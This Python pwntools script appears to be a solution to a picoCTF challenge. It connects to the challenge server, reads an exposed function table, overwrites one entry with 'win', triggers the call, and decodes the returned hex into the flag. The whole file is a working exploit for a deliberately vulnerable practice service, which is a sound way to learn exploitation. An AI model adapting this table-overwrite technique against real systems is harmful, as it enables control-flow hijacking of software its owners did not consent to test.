from plumbum.cli import ConfigINI
from pwnlib.tubes.remote import remote
from pwnlib.context import context
from pwn import *

host = "saturn.picoctf.net"
port = 54024
io = remote(host, port)
context.log_level = 'info'

# print help
io.recvuntil(b'==> ')
io.sendline(b'?')
io.recvline()

# read variable choice
io.recvuntil(b'==> ')
io.sendline(b'2')

# read func_table variable
io.recvuntil(b'Please enter variable name to read: ')
io.sendline(b'func_table')

# mirroring server's global variable
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
func_table: str = io.recvline().decode()[:-1]
# print(f"Function table:\n{func_table}")
# print(f"Function table len: {len(func_table)}")

# targeted write_var
n = 2
func_name = ''
func_name_offset = n * FUNC_TABLE_ENTRY_SIZE
for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
    if( func_table[i] == ' '):
        func_name = func_table[func_name_offset:i]
        break
# print(f"Target function: {func_name}")

# overwrite func_table
n = 3
injected = "win".ljust(FUNC_TABLE_ENTRY_SIZE, " ")
func_name = ''
func_name_offset = n * FUNC_TABLE_ENTRY_SIZE
index = 0
func_table = list(func_table)
for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
    func_table[i] = injected[index]
    index += 1
func_table = "".join(func_table)
# print(func_table)

# print help & sanity check
io.recvuntil(b'==> ')
io.sendline(b'?')
io.recvuntil(b'==> ')
io.sendline(b'3')
io.recvuntil(b'Please enter variable name to write: ')
io.sendline(b'func_table')

# rewrite func_table
io.recvuntil(b'Please enter new value of variable: ')
io.send(f"'{func_table}'".encode())
io.send(b'\n')

# print help & sanity check
io.recvuntil(b'==> ')
io.sendline(b'?')
# read variable choice
io.recvuntil(b'==> ')
io.sendline(b'2')
# read func_table variable
io.recvuntil(b'Please enter variable name to read: ')
io.sendline(b'func_table')
io.recvline()

# trying call win function
io.recvuntil(b'==> ')
io.sendline(b'4')
ciphertext: str = io.recvline().decode().split(' ')
# print(ciphertext)
io.close()

flag = ""
for i in range(len(ciphertext) - 1):
    flag += chr(int(ciphertext[i], 16))

print(f"Flag: {flag}")